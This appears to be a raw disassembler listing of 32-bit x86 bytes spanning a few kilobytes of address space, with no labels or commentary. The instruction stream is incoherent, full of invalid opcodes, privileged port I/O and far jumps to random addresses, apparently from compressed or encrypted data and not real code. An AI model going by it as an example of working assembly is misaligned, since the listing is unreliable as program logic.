  403910:	pusha  
  403911:	dec    esi
  403912:	test   BYTE PTR [edx],ch
  403914:	popf   
  403915:	lock add BYTE PTR [edx+ebp*1-0x69],bl
  40391a:	dec    edi
  40391b:	mov    dl,0x5e
  40391d:	rol    BYTE PTR ds:0x6f9043ac,0x4b
  403924:	sbb    cl,BYTE PTR ss:0x3c20a603
  40392b:	(bad)
  40392f:	xchg   BYTE PTR [ecx+esi*4],bl
  403932:	adc    cl,bl
  403934:	jmp    0xed0f0ff
  403939:	mov    esp,0x151b9ec1
  40393e:	dec    edx
  40393f:	sub    al,0x60
  403941:	jmp    0x47bd:0xdccc86a7
  403948:	add    ah,dl
  40394a:	lock sbb DWORD PTR [ebx],ebx
  40394d:	xchg   ecx,eax
  40394e:	cmp    edx,DWORD PTR [eax]
  403950:	xchg   esp,eax
  403951:	xchg   ebp,eax
  403952:	push   eax
  403953:	rcl    BYTE PTR [eax-0x7f],0xae
  403957:	int3   
  403958:	inc    esp
  403959:	gs mov edi,0x6f7525d8
  40395f:	pusha  
  403960:	imul   BYTE PTR [eax]
  403962:	jp     0x403958
  403964:	jmp    0x4038ee
  403966:	out    dx,al
  403967:	test   al,0xee
  403969:	push   esi
  40396a:	pop    esi
  40396b:	mov    ebp,0x5067a508
  403970:	cdq    
  403971:	push   esp
  403972:	ins    BYTE PTR es:[edi],dx
  403973:	adc    BYTE PTR [edx+0x6b1c3e4f],bh
  403979:	enter  0x84e4,0xef
  40397d:	push   ss
  40397e:	(bad)  
  40397f:	mov    esi,0x3e02c96c
  403984:	adc    eax,DWORD PTR [edi-0x7e]
  403987:	inc    esp
  403988:	mov    ch,cl
  40398a:	cdq    
  40398b:	retf   0x4e61
  40398e:	inc    BYTE PTR [ebp+eiz*8-0x2e1bd5dc]
  403995:	xchg   edx,eax
  403996:	arpl   WORD PTR [edi-0x31],ax
  403999:	mov    ds:0x110c585e,eax
  40399e:	mov    ah,0xba
  4039a0:	mov    WORD PTR [esi-0x720c8dfb],ss
  4039a6:	enter  0x60e7,0x44
  4039aa:	xchg   ebx,eax
  4039ab:	push   edx
  4039ac:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4039ad:	fisttp WORD PTR [ebx-0x38bfb99d]
  4039b3:	das    
  4039b4:	test   cl,bl
  4039b6:	mov    ?,WORD PTR [eax+edx*1-0x18]
  4039ba:	lds    ecx,FWORD PTR ds:[ebx-0x7c]
  4039be:	sub    ebx,ebp
  4039c0:	(bad)  
  4039c1:	daa    
  4039c2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4039c3:	mov    bh,0x72
  4039c6:	sub    BYTE PTR [edi+edi*1+0x3a924d8a],dh
  4039cd:	cwde   
  4039ce:	jbe    0x4039f9
  4039d0:	es inc edi
  4039d2:	or     edx,esi
  4039d4:	icebp  
  4039d5:	out    dx,eax
  4039d6:	retf   
  4039d7:	mov    dh,0xee
  4039d9:	jp     0x40399c
  4039db:	in     eax,0xc5
  4039dd:	aas    
  4039de:	pop    ds
  4039df:	or     eax,edx
  4039e1:	mov    al,ds:0x6fb98b44
  4039e6:	jmp    0x7bfa:0x5856083f
  4039ed:	xor    eax,0xe759d57c
  4039f2:	mov    bl,0x8f
  4039f4:	inc    edx
  4039f5:	cwde   
  4039f6:	leave  
  4039f7:	and    ebx,ebx
  4039f9:	dec    edi
  4039fa:	ja     0x4039f6
  4039fc:	(bad)  [ebp-0x14]
  4039ff:	mov    edx,0x4d743b05
  403a04:	test   al,0xb9
  403a06:	mov    esi,0x7c3c2340
  403a0b:	cli    
  403a0c:	into   
  403a0d:	aad    0x2e
  403a0f:	stos   DWORD PTR es:[edi],eax
  403a10:	js     0x403a43
  403a12:	mov    esp,0x8e3f1cce
  403a17:	xor    DWORD PTR [esi+0x22c2d357],edx
  403a1d:	mov    ecx,0xbc35da1c
  403a22:	aaa    
  403a23:	pop    eax
  403a24:	push   0x3f
  403a26:	mov    ?,edi
  403a28:	je     0x4039d3
  403a2a:	jecxz  0x4039f2
  403a2c:	cdq    
  403a2d:	fisttp DWORD PTR [edi+0x10]
  403a30:	test   DWORD PTR [ebx],edx
  403a32:	dec    eax
  403a33:	pop    ss
  403a34:	push   cs
  403a35:	call   FWORD PTR [ebp-0x5ba19854]
  403a3b:	push   ebx
  403a3c:	jmp    0x403a72
  403a3e:	pop    edi
  403a3f:	nop
  403a40:	mov    ebp,0x3970ee29
  403a45:	inc    edx
  403a46:	jb     0x403a70
  403a48:	jne    0x403ac3
  403a4a:	lea    esp,[ebx-0x4c3c226c]
  403a50:	or     eax,0xc44c6497
  403a55:	push   ds
  403a56:	ret    0x4599
  403a59:	sbb    BYTE PTR [esp+edx*1],bl
  403a5c:	cmp    edi,ebx
  403a5e:	aad    0x8
  403a60:	push   ss
  403a61:	sbb    bl,BYTE PTR [edx-0x5]
  403a64:	lods   al,BYTE PTR ds:[esi]
  403a65:	or     ebp,DWORD PTR [eax]
  403a67:	out    dx,al
  403a68:	jne    0x403add
  403a6a:	sub    edi,DWORD PTR [ecx-0x28770664]
  403a70:	adc    DWORD PTR [ecx],0xffffff91
  403a73:	mov    BYTE PTR [esi],bh
  403a75:	mov    ch,0x21
  403a77:	jo     0x403ac8
  403a79:	mov    edx,0x403d9668
  403a7e:	lods   al,BYTE PTR ds:[esi]
  403a7f:	xchg   ebx,eax
  403a80:	nop
  403a81:	jnp    0x403a4b
  403a83:	jmp    0x403aed
  403a85:	lods   al,BYTE PTR ds:[esi]
  403a86:	mov    ebx,0x5491dc78
  403a8b:	test   DWORD PTR [edi+0x119405b2],esi
  403a91:	fsubr  QWORD PTR [edx-0x5c]
  403a94:	sbb    ecx,DWORD PTR [eax+0x170c675a]
  403a9a:	pushf  
  403a9b:	js     0x403aa7
  403a9d:	push   ebx
  403a9e:	(bad)  
  403a9f:	and    eax,0x1acb09b2
  403aa4:	ret    0x99e5
  403aa7:	or     dl,BYTE PTR [ebx+0x71850f0b]
  403aad:	leave  
  403aae:	bound  edx,QWORD PTR [ebx]
  403ab0:	xor    DWORD PTR [eax+0x43],edi
  403ab3:	jns    0x403aa1
  403ab5:	in     al,0x9f
  403ab7:	xor    edi,DWORD PTR [eax+0x7bcb27d8]
  403abd:	dec    edx
  403abe:	addr16 repnz push edx
  403ac1:	arpl   ax,cx
  403ac3:	dec    edx
  403ac4:	gs mov ebx,0x1156b13b
  403aca:	dec    ebx
  403acb:	pop    ebx
  403acc:	mov    DWORD PTR [ebx+0x42d0e2fd],ecx
  403ad2:	ss mov ecx,0x94f2f040
  403ad8:	cli    
  403ad9:	pushf  
  403ada:	mov    bh,0xfd
  403adc:	pop    edx
  403add:	leave  
  403ade:	add    eax,0xbcd2aaf9
  403ae3:	xor    al,BYTE PTR [eax+0x15d26bbe]
  403ae9:	or     ebx,DWORD PTR [eax]
  403aeb:	push   ss
  403aec:	add    eax,0xfc602d7e
  403af1:	int3   
  403af2:	xor    al,0x8a
  403af4:	pop    ecx
  403af5:	or     al,0x4a
  403af7:	mov    esi,0x8a8d39e5
  403afc:	pop    ebx
  403afd:	fmul   DWORD PTR [ecx-0x7e499614]
  403b03:	or     ecx,DWORD PTR [esi-0x32]
  403b06:	sbb    eax,0xcc7c5e8e
  403b0b:	test   eax,0xffded4fa
  403b10:	mov    dl,0x35
  403b12:	retf   
  403b13:	inc    ebx
  403b14:	jl     0x403b32
  403b16:	dec    edi
  403b17:	jmp    DWORD PTR [edi+0x6f]
  403b1a:	sahf   
  403b1b:	pop    ss
  403b1c:	push   cs
  403b1d:	mov    esp,0xd63552fb
  403b22:	dec    esi
  403b23:	mov    edi,0xea9b869f
  403b28:	imul   ecx,DWORD PTR [esi],0x68
  403b2b:	jae    0x403abf
  403b2d:	jg     0x403b10
  403b2f:	cmp    al,0x75
  403b31:	dec    esp
  403b32:	sbb    eax,0x4ae2d992
  403b37:	jnp    0x403b95
  403b39:	cmp    al,0xa
  403b3b:	xor    esi,DWORD PTR [ebp+ecx*8-0xd]
  403b3f:	mov    ds:0x475233d7,eax
  403b44:	mov    dl,0x6a
  403b46:	xor    al,0xd7
  403b48:	inc    ebx
  403b49:	or     BYTE PTR [eax-0x3c],ah
  403b4c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403b4d:	ret    0x219e
  403b50:	mov    ds:0x703b5bd,eax
  403b55:	sub    dl,BYTE PTR [ebx+esi*8+0x5e]
  403b59:	jno    0x403b4e
  403b5b:	js     0x403bc5
  403b5d:	ret    
  403b5e:	dec    esi
  403b5f:	(bad)  
  403b60:	cs sub al,0x79
  403b63:	in     al,0x6b
  403b65:	popa   
  403b66:	mov    esi,0xe36df601
  403b6b:	inc    ebp
  403b6c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403b6d:	cmp    BYTE PTR [edi+edi*2+0x3f303d1e],0xf8
  403b75:	pop    ebp
  403b76:	mov    ds:0x87601499,al
  403b7b:	fdivr  st,st(4)
  403b7d:	mov    bl,0x2f
  403b7f:	jg     0x403b12
  403b81:	xlat   BYTE PTR ds:[ebx]
  403b82:	ins    BYTE PTR es:[edi],dx
  403b83:	mov    ch,0x31
  403b85:	scas   eax,DWORD PTR es:[edi]
  403b86:	popa   
  403b87:	jns    0x403b4d
  403b89:	retf   
  403b8a:	xchg   esp,eax
  403b8b:	bound  ebx,QWORD PTR [edx]
  403b8d:	sub    dh,BYTE PTR [edx-0x69]
  403b90:	jbe    0x403bd2
  403b92:	xchg   edx,eax
  403b93:	jnp    0x403ba7
  403b95:	mov    ch,0x90
  403b97:	fisubr DWORD PTR [edi]
  403b99:	inc    ebp
  403b9a:	inc    ecx
  403b9b:	out    dx,eax
  403b9c:	in     al,0xe8
  403b9e:	push   esi
  403b9f:	and    esi,DWORD PTR [ecx]
  403ba1:	push   edx
  403ba2:	mov    esi,0xbf597ad6
  403ba7:	out    0xb4,eax
  403ba9:	vpshlb xmm10,[ecx+0x2de97f67],xmm0
  403bb2:	clc    
  403bb3:	dec    ebp
  403bb4:	fs neg esi
  403bb7:	test   eax,0x96293a82
  403bbc:	rcr    ch,0xe5
  403bbf:	mov    eax,0xb766d039
  403bc4:	jns    0x403bea
  403bc6:	shr    DWORD PTR [edi-0x43],1
  403bc9:	xor    ebx,esp
  403bcb:	cli    
  403bcc:	fs scas al,BYTE PTR es:[edi]
  403bce:	mov    ds:0x3b5a15f,al
  403bd3:	jle    0x403bda
  403bd5:	pop    ecx
  403bd6:	out    dx,al
  403bd7:	xlat   BYTE PTR ds:[ebx]
  403bd8:	mov    ebp,0xf59d7c35
  403bdd:	mov    WORD PTR [edx+0x721d387c],?
  403be3:	pop    esp
  403be4:	and    ebx,edx
  403be6:	lock call 0xea97:0x770e3b81
  403bee:	adc    eax,0x9c6529ab
  403bf3:	xchg   ebp,eax
  403bf4:	aam    0x76
  403bf6:	mov    ebp,0xda3d6f42
  403bfb:	call   0x49e47383
  403c00:	stos   DWORD PTR es:[edi],eax
  403c01:	jbe    0x9f149656
  403c07:	and    dh,BYTE PTR [edx-0x473c7aa6]
  403c0d:	mov    bh,0x13
  403c0f:	jge    0x403c3f
  403c11:	dec    ebx
  403c12:	or     ch,BYTE PTR [ebp+0x34]
  403c15:	iret   
  403c16:	mov    esp,0x2fd57021
  403c1b:	xor    ebx,DWORD PTR [edi]
  403c1d:	aam    0x71
  403c1f:	test   al,0x5e
  403c21:	sbb    al,0x80
  403c23:	and    BYTE PTR [ebx-0x6e],bh
  403c26:	aas    
  403c27:	xor    BYTE PTR [ebx],cl
  403c29:	fistp  DWORD PTR [esi]
  403c2b:	repz sub DWORD PTR [ebx],edx
  403c2e:	add    al,0xa4
  403c30:	inc    edi
  403c31:	push   edi
  403c32:	scas   eax,DWORD PTR es:[edi]
  403c33:	loope  0x403bd6
  403c35:	lods   eax,DWORD PTR ds:[esi]
  403c36:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403c37:	cmp    ebx,DWORD PTR [eax]
  403c39:	jns    0x403c96
  403c3b:	push   ecx
  403c3c:	sub    ebp,ebx
  403c3e:	mov    edi,edi
  403c40:	int3   
  403c41:	mov    dh,0x17
  403c43:	stc    
  403c44:	ret    
  403c45:	neg    BYTE PTR [ecx+0x3cfdbd17]
  403c4b:	dec    ebx
  403c4c:	mov    al,0xc2
  403c4e:	jp     0x403ccb
  403c50:	idiv   BYTE PTR [edx+0x361286f2]
  403c56:	test   al,0xff
  403c58:	sub    esp,eax
  403c5a:	mov    ah,0x74
  403c5c:	cmp    edx,esi
  403c5e:	icebp  
  403c5f:	test   BYTE PTR [esi-0x678a1149],0xde
  403c66:	(bad)  
  403c67:	fnsave [esi+0x63]
  403c6a:	or     eax,0xeda8bea1
  403c6f:	dec    ebp
  403c70:	fdiv   QWORD PTR [eax]
  403c72:	cdq    
  403c73:	clc    
  403c74:	fnstenv ds:0x4f2b3fa9
  403c7a:	adc    ebx,DWORD PTR ds:[edi-0x1838e7ae]
  403c81:	enter  0x1d50,0x5c
  403c85:	cmovno eax,DWORD PTR [ecx-0x6]
  403c89:	ds xchg esp,eax
  403c8b:	call   0x588d:0x98316272
  403c92:	(bad)  
  403c93:	mov    bh,0x7a
  403c95:	mov    DWORD PTR [ebx],edi
  403c97:	inc    ecx
  403c98:	jg     0x403c54
  403c9a:	mov    ebx,DWORD PTR [ebx+0x416b09c8]
  403ca0:	mov    bh,0xd4
  403ca2:	dec    ebp
  403ca3:	cmp    al,0x1b
  403ca5:	shl    BYTE PTR [esi+0x38],cl
  403ca8:	stos   BYTE PTR es:[edi],al
  403ca9:	sub    DWORD PTR [edi-0x71],ebx
  403cac:	push   es
  403cad:	aad    0xc4
  403caf:	and    dl,BYTE PTR ds:0x41b5190f
  403cb5:	xor    eax,0xabd8a520
  403cba:	(bad)  
  403cbb:	jmp    0x403d25
  403cbd:	jo     0x403d29
  403cbf:	mov    edx,0xdb752e51
  403cc4:	sbb    dl,BYTE PTR [ebx+0x106e212d]
  403cca:	adc    BYTE PTR [edi],cl
  403ccc:	fwait
  403ccd:	jo     0x403cd0
  403ccf:	and    DWORD PTR [esi-0xb],esi
  403cd2:	pop    ebx
  403cd3:	add    eax,0xd661dc7
  403cd8:	pushf  
  403cd9:	mov    DWORD PTR [edx],esp
  403cdb:	xor    ecx,DWORD PTR [edi-0x77]
  403cde:	outs   dx,BYTE PTR ds:[esi]
  403cdf:	into   
  403ce0:	sub    edx,ebp
  403ce2:	das    
  403ce3:	xlat   BYTE PTR ds:[ebx]
  403ce4:	jmp    0x403cca
  403ce6:	jmp    0xcefd:0xeb4071d4
  403ced:	jmp    0x54fadd89
  403cf2:	xor    al,0xd4
  403cf4:	ja     0x403d08
  403cf6:	dec    esi
  403cf7:	adc    eax,0x9c716f8c
  403cfc:	or     BYTE PTR [eax+eax*8-0x35d420ba],al
  403d03:	aas    
  403d04:	jg     0x403d32
  403d06:	mov    edi,0xcd133467
  403d0b:	inc    ebx
  403d0c:	jb     0x403d28
  403d0e:	xchg   ebp,eax
  403d0f:	repnz add BYTE PTR [edi],0x63
  403d13:	outs   dx,BYTE PTR ds:[esi]
  403d14:	std    
  403d15:	mov    ch,ah
  403d17:	pop    esp
  403d18:	aaa    
  403d19:	pop    eax
  403d1a:	pushf  
  403d1b:	jecxz  0x403ce8
  403d1d:	and    al,BYTE PTR [edx+0x7279210a]
  403d23:	pop    ebp
  403d24:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403d25:	add    DWORD PTR [ecx+0x700d0e18],ebx
  403d2b:	test   BYTE PTR [esp+edi*2+0x1f],0x46
  403d30:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403d31:	ret    0xe978
  403d34:	ror    DWORD PTR [ebp+0x796ff13d],0x2a
  403d3b:	es cs push ebp
  403d3e:	pop    DWORD PTR [eax+edx*8]
  403d41:	mov    edx,0xb6954c53
  403d46:	cdq    
  403d47:	out    dx,al
  403d48:	pusha  
  403d49:	sbb    BYTE PTR [esi+0x15],dh
  403d4c:	enter  0xe080,0xfb
  403d50:	mov    ah,0xc2
  403d52:	int3   
  403d53:	push   ecx
  403d54:	ins    DWORD PTR es:[edi],dx
  403d55:	mov    esi,0x2c91ef48
  403d5a:	adc    edx,eax
  403d5c:	into   
  403d5d:	loope  0x403d63
  403d5f:	imul   BYTE PTR [ecx+0x6e]
  403d62:	dec    eax
  403d63:	dec    ecx
  403d64:	mov    ah,0xa4
  403d66:	or     dh,BYTE PTR [ecx+0x5ac9d766]
  403d6c:	imul   eax,ebx,0x17d1fe93
  403d72:	mov    bl,0xaa
  403d74:	retf   
  403d75:	inc    esp
  403d76:	cli    
  403d77:	bnd jae 0x403d77
  403d7a:	call   0x841b65ee
  403d7f:	std    
  403d80:	xor    ah,BYTE PTR [edx]
  403d82:	pusha  
  403d83:	cli    
  403d84:	in     eax,dx
  403d85:	arpl   WORD PTR [esi-0x73],bx
  403d88:	xor    al,0x22
  403d8a:	jne    0x403d16
  403d8c:	sub    BYTE PTR [eax],dh
  403d8e:	fs push ebp
  403d90:	les    edi,FWORD PTR ds:0x3196e09a
  403d96:	jmp    0x9f98:0x4e4e75b8
  403d9d:	xchg   BYTE PTR [ebp+0x26],al
  403da0:	dec    eax
  403da1:	jne    0x403e0e
  403da3:	mov    ecx,0x9a060021
  403da8:	cmp    eax,0x2d6991fd
  403dad:	xchg   edx,eax
  403dae:	std    
  403daf:	inc    esi
  403db0:	sti    
  403db1:	ja     0x403d45
  403db3:	addr16 pop ebp
  403db5:	push   esp
  403db6:	add    eax,0xbba23e99
  403dbb:	or     al,0xab
  403dbd:	dec    ebx
  403dbe:	mov    ds:0x9570a706,eax
  403dc3:	or     DWORD PTR [edi],0xffffffef
  403dc6:	bnd jge 0x403df0
  403dc9:	and    eax,0x36dfe2a7
  403dce:	aad    0x8a
  403dd0:	ficomp WORD PTR [eax-0x5d41fb51]
  403dd6:	(bad)  
  403dd7:	shl    dh,1
  403dd9:	or     eax,0xf30866e6
  403dde:	aaa    
  403ddf:	out    dx,eax
  403de0:	mov    cl,0x87
  403de2:	mov    ah,0xe2
  403de4:	call   0x3e5d:0xbd95152
  403deb:	cli    
  403dec:	adc    bl,BYTE PTR [edx]
  403dee:	cmp    al,0xbe
  403df0:	sbb    edx,DWORD PTR [esi]
  403df2:	and    DWORD PTR [ebp-0x13],ebp
  403df5:	inc    ebp
  403df6:	mov    ecx,0xf5b4f0ad
  403dfb:	pop    esi
  403dfc:	in     al,dx
  403dfd:	int3   
  403dfe:	rcl    dh,0xcd
  403e01:	pusha  
  403e02:	xchg   ebp,eax
  403e03:	jl     0x403d8f
  403e05:	push   es
  403e06:	daa    
  403e07:	mov    ecx,ebx
  403e09:	inc    ecx
  403e0a:	cdq    
  403e0b:	mov    ebx,0xa433641
  403e10:	fwait
  403e11:	(bad)  
  403e12:	aam    0xf2
  403e14:	push   es
  403e15:	sti    
  403e16:	test   BYTE PTR [eax-0x2f],dh
  403e19:	jp     0x403da4
  403e1b:	shl    DWORD PTR [edi-0x25],cl
  403e1e:	(bad)  
  403e1f:	in     al,0x85
  403e21:	arpl   WORD PTR [edx],si
  403e23:	mov    eax,ds:0xc1be000e
  403e28:	(bad)  
  403e29:	retf   0x1d38
  403e2c:	into   
  403e2d:	adc    al,0x6a
  403e2f:	jbe    0x403e59
  403e31:	icebp  
  403e32:	push   ecx
  403e33:	add    DWORD PTR [edi+edx*8],ebp
  403e36:	jmp    0x85fc:0x864c9900
  403e3d:	ds push ecx
  403e3f:	or     BYTE PTR [ecx],ah
  403e41:	xchg   esp,eax
  403e42:	cs dec esp
  403e44:	(bad)  
  403e45:	nop
  403e46:	or     ch,BYTE PTR [esi+0x1c]
  403e49:	ret    0xcebc
  403e4c:	js     0x403e45
  403e4e:	inc    edi
  403e4f:	and    eax,0x5685e699
  403e54:	add    al,0xc1
  403e56:	lds    ebp,FWORD PTR [edx-0x40d1bd54]
  403e5c:	lea    edx,[eax-0x374aa8c5]
  403e62:	jo     0x403e74
  403e64:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403e65:	and    ah,BYTE PTR [edi-0xdd66a27]
  403e6b:	nop
  403e6c:	adc    eax,0x49bbe80d
  403e71:	xlat   BYTE PTR ds:[ebx]
  403e72:	xchg   ecx,eax
  403e73:	repz rcl ebp,1
  403e76:	dec    edi
  403e77:	jmp    FWORD PTR [ecx]
  403e79:	lods   eax,DWORD PTR ds:[esi]
  403e7a:	sbb    BYTE PTR [edx],dl
  403e7c:	or     eax,0x2a631b89
  403e81:	sahf   
  403e82:	jnp    0x403ea2
  403e84:	pushfw 
  403e86:	xor    DWORD PTR [edx+0x10ced166],eax
  403e8c:	sbb    cl,BYTE PTR [ecx]
  403e8e:	sub    eax,0xaee63a0e
  403e93:	lods   al,BYTE PTR ds:[esi]
  403e94:	cli    
  403e95:	or     dl,BYTE PTR [eax-0x47]
  403e98:	adc    edx,edx
  403e9a:	outs   dx,DWORD PTR ds:[esi]
  403e9b:	add    DWORD PTR [ecx+ecx*8],eax
  403e9e:	dec    esi
  403e9f:	(bad)  
  403ea0:	mov    ds:0xf2b7971e,eax
  403ea5:	push   0x53
  403ea7:	xor    BYTE PTR [esi+0x2398e5d8],ah
  403ead:	fadd   DWORD PTR [esi-0x5d3e6032]
  403eb3:	lods   al,BYTE PTR ds:[esi]
  403eb4:	pop    ecx
  403eb5:	lahf   
  403eb6:	stos   BYTE PTR es:[edi],al
  403eb7:	fldenv [ecx]
  403eb9:	dec    ebx
  403eba:	inc    eax
  403ebb:	retf   
  403ebc:	pop    ebx
  403ebd:	arpl   WORD PTR [ebx],si
  403ebf:	mov    dh,0xca
  403ec1:	cmp    BYTE PTR [bp+di],0x6a
  403ec5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403ec6:	pop    esp
  403ec7:	lods   eax,DWORD PTR ds:[esi]
  403ec8:	aam    0xcb
  403eca:	push   ecx
  403ecb:	sar    ebp,1
  403ecd:	mov    eax,0x5b44baae
  403ed2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403ed3:	(bad)  
  403ed4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403ed5:	dec    eax
  403ed6:	leave  
  403ed7:	std    
  403ed8:	fmul   QWORD PTR [ebx-0x1cba8b91]
  403ede:	cli    
  403edf:	mov    eax,ds:0x60af16c6
  403ee4:	ficomp DWORD PTR [edi+ebx*2+0x78]
  403ee8:	loopne 0x403e9b
  403eea:	jmp    0x403f0d
  403eec:	mov    ebx,DWORD PTR [edi-0x34]
  403eef:	pop    ebp
  403ef0:	dec    ecx
  403ef1:	dec    edi
  403ef2:	cs inc edi
  403ef4:	dec    ecx
  403ef5:	dec    ebx
  403ef6:	repz lock jbe 0x403f19
  403efa:	stos   DWORD PTR es:[edi],eax
  403efb:	test   al,0x6a
  403efd:	or     ebp,0xaf3abd68
  403f03:	in     eax,0xe8
  403f05:	xchg   BYTE PTR [edi-0x6cff5f70],bl
  403f0b:	push   eax
  403f0c:	sub    eax,0xda43ad1f
  403f11:	gs push 0x98fe65e0
  403f17:	fisttp QWORD PTR [edx-0x3d92f0a6]
  403f1d:	push   0x4c098cdf
  403f22:	call   0x41824ec6
  403f27:	sub    DWORD PTR [edx],eax
  403f29:	push   ds
  403f2a:	ror    BYTE PTR [eax+0x32],1
  403f2d:	retf   0x7fb1
  403f30:	push   ds
  403f31:	inc    esp
  403f32:	out    0xf8,eax
  403f34:	pop    ebp
  403f35:	loop   0x403f5d
  403f37:	pop    esi
  403f38:	jae    0x403ec7
  403f3a:	test   BYTE PTR [eax+0x40],al
  403f3d:	sar    DWORD PTR [ebp-0x6e],cl
  403f40:	loope  0x403ee4
  403f42:	addr16 aaa 
  403f44:	mov    BYTE PTR [eax-0x28e3e5d5],0x1f
  403f4b:	fstp   TBYTE PTR [ecx-0x48]
  403f4e:	pushf  
  403f4f:	mov    ch,0x58
  403f51:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403f52:	or     al,BYTE PTR [esi]
  403f54:	inc    edx
  403f55:	xor    eax,0x9c971a4d
  403f5a:	das    
  403f5b:	cmp    esi,DWORD PTR [ebx+0x1b]
  403f5e:	call   FWORD PTR [edi+0xe]
  403f61:	add    bh,ch
  403f63:	push   cs
  403f64:	(bad)  
  403f65:	scas   eax,DWORD PTR es:[edi]
  403f66:	jo     0x403f35
  403f68:	xor    al,0xf8
  403f6a:	rcl    BYTE PTR [ebp+0x218d4955],1
  403f70:	xchg   esi,eax
  403f71:	xchg   esi,eax
  403f72:	adc    DWORD PTR [ecx-0x61],edi
  403f75:	jb     0x403fb9
  403f77:	dec    ecx
  403f78:	cmp    BYTE PTR [esi+0x2a692f34],cl
  403f7e:	jmp    0xab70:0x19cea7a4
  403f85:	shl    BYTE PTR [eax-0x3e],1
  403f88:	sub    BYTE PTR [ecx+0x33],dh
  403f8b:	inc    edx
  403f8c:	add    al,0x90
  403f8e:	sub    eax,0x3299cb76
  403f93:	mov    dh,0xa
  403f95:	adc    al,ch
  403f97:	adc    esp,DWORD PTR [eax-0x6318541d]
  403f9d:	out    0xbf,al
  403f9f:	sbb    BYTE PTR [ecx+0x7d],dl
  403fa2:	mov    ecx,0x24a1bf4c
  403fa7:	push   ebx
  403fa8:	fs push 0x24
  403fab:	rol    BYTE PTR [esi-0x36],cl
  403fae:	(bad)  
  403faf:	mov    ch,0xca
  403fb1:	ss mov ah,0xda
  403fb4:	jns    0x40400f
  403fb6:	ss adc al,0xca
  403fb9:	mov    ds,WORD PTR [edx]
  403fbb:	neg    BYTE PTR [ecx+0xd9164a8]
  403fc1:	imul   ecx,eax,0x25353a67
  403fc7:	xchg   cl,dl
  403fc9:	sbb    al,0x50
  403fcb:	mov    eax,ds:0x932eda16
  403fd0:	lock sbb cl,BYTE PTR [ecx+esi*2+0x5f7525e8]
  403fd8:	fs pop esp
  403fda:	jnp    0x403fde
  403fdc:	add    edi,0xf4e3fd91
  403fe2:	mov    ecx,0x1d0ba98b
  403fe7:	aas    
  403fe8:	mov    edx,DWORD PTR [edx+0x68a2cb06]
  403fee:	clc    
  403fef:	cmp    edx,DWORD PTR [eax-0x12]
  403ff2:	cmp    bh,BYTE PTR [ebx-0x79]
  403ff5:	nop
  403ff6:	ds icebp 
  403ff8:	jle    0x404058
  403ffa:	add    esi,DWORD PTR [eax-0x4c]
  403ffd:	pop    ds
  403ffe:	fistp  DWORD PTR [esi]
  404000:	mov    ds:0x6556357d,al
  404005:	inc    ecx
  404006:	mov    bl,0x46
  404008:	sbb    esp,DWORD PTR gs:[ebp+0x5239043a]
  40400f:	push   eax
  404010:	pop    ss
  404011:	xchg   edi,eax
  404012:	or     al,0xbd
  404014:	rcl    BYTE PTR [eax+edx*2-0x30],cl
  404018:	popf   
  404019:	and    ebx,ebp
  40401b:	call   0x947e143a
  404020:	or     DWORD PTR [ecx+0x6f],esp
  404023:	push   esp
  404024:	inc    ecx
  404025:	loopne 0x403fd7
  404027:	push   esp
  404028:	ror    DWORD PTR [ecx+0x4cb6b151],0xa
  40402f:	adc    DWORD PTR [edx+0x622f3638],0x49af7703
  404039:	mov    ch,0xc5
  40403b:	int    0xeb
  40403d:	(bad)  
  40403f:	add    DWORD PTR [ebx-0x4b],eax
  404042:	test   eax,0xcb5dfee8
  404047:	pop    ebx
  404048:	cmp    BYTE PTR [ecx+eiz*2],0x98
  40404c:	sub    dh,BYTE PTR [eax+0x4571ea89]
  404052:	xchg   ebp,eax
  404053:	mov    esp,0xdfdacd0f
  404058:	test   DWORD PTR [esp+eax*8+0x31],0x8dba8af4
  404060:	stc    
  404061:	call   0x9aa1:0x20871cb2
  404068:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404069:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40406a:	mov    al,ds:0xc44c6863
  40406f:	adc    ecx,DWORD PTR [eax-0xe98b984]
  404075:	stos   DWORD PTR es:[edi],eax
  404076:	ret    0x98fd
  404079:	shl    BYTE PTR [ecx+0x7d],cl
  40407c:	(bad)  
  40407d:	mov    ebp,0xa4242f4
  404082:	(bad)  [esp+edx*4]
  404085:	inc    edi
  404086:	xor    al,0xda
  404088:	sbb    BYTE PTR [ecx],bh
  40408a:	iret   
  40408b:	pop    edi
  40408c:	or     ebp,esi
  40408e:	pop    ecx
  40408f:	fmul   QWORD PTR [esi]
  404091:	inc    edi
  404092:	outs   dx,BYTE PTR ds:[esi]
  404093:	int    0x2a
  404095:	repz xlat BYTE PTR ds:[ebx]
  404097:	jge    0x4040bc
  404099:	mov    ds:0x1b8a606a,al
  40409e:	cmp    DWORD PTR [ebp-0x6],ecx
  4040a1:	fdiv   QWORD PTR ds:0xdf442020
  4040a7:	mov    ch,0x0
  4040a9:	jle    0x4040e4
  4040ab:	add    ecx,DWORD PTR [esi+0x52]
  4040ae:	xchg   DWORD PTR [ebp+0x3b],ebp
  4040b1:	and    al,0x45
  4040b3:	add    eax,esp
  4040b5:	adc    DWORD PTR [edi-0x5e],ebx
  4040b8:	inc    esi
  4040b9:	ins    BYTE PTR es:[edi],dx
  4040ba:	mov    edx,0x4889ab96
  4040bf:	mov    ebx,0x2383dfd4
  4040c4:	rcl    BYTE PTR [eax],cl
  4040c6:	push   ebp
  4040c7:	jl     0x40413e
  4040c9:	ds inc ebp
  4040cb:	retf   0xa807
  4040ce:	aad    0xc
  4040d0:	call   0x25261afd
  4040d5:	imul   eax,DWORD PTR [edi+0x1f],0xf8ba2535
  4040dc:	ins    BYTE PTR es:[edi],dx
  4040dd:	and    esi,DWORD PTR [ebx-0x26]
  4040e0:	les    edx,FWORD PTR [edx+0xf7af46e]
  4040e6:	ror    DWORD PTR [edi+esi*8+0x10fbe3f2],0x12
